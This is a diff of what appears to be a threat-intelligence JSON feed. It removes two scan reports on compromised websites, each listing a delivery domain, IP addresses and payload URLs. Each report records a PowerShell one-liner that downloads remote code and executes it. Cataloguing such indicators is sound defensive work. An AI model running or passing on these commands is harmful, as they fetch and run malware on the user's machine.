@@ -5504,53 +5504,5 @@
     ],
     "ReportId": "cmwbez2fg06ao0nmlov0j0g7o",
     "ScannedAt": "2026-11-11T01:02:03.343000+00:00"
-  },
-  {
-    "UrlDomain": "thefoodsauciety.co.uk",
-    "DeliveryUrl": [
-      "browse-nnccodes.beer"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "187.77.100.8"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-nnccodes.beer/c7b605b31ca2f950",
-        "Type": "payload download"
-      },
-      {
-        "Value": "https://browse-nnccodes.beer/api.php?s=bc8dc0ce0c96053fe5d005b5065340e6a77e4a01ae5898f7&amp;_v=29905977",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-nnccodes.beer/c7b605b31ca2f950'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-nnccodes.beer/c7b605b31ca2f950"
-    ],
-    "ReportId": "cmwbetx19069t0nmlxbqcg989",
-    "ScannedAt": "2026-11-11T00:58:03.052000+00:00"
-  },
-  {
-    "UrlDomain": "website-wizard.de",
-    "DeliveryUrl": [
-      "browse-nnccodes.beer"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "89.22.104.110"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-nnccodes.beer/1e24abac1ebd5ed2",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "irm 'browse-nnccodes.beer/1e24abac1ebd5ed2'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-nnccodes.beer/1e24abac1ebd5ed2"
-    ],
-    "ReportId": "cmwbejue2065s0nmlscnp3a86",
-    "ScannedAt": "2026-11-11T00:50:13.046000+00:00"
   }
 ]
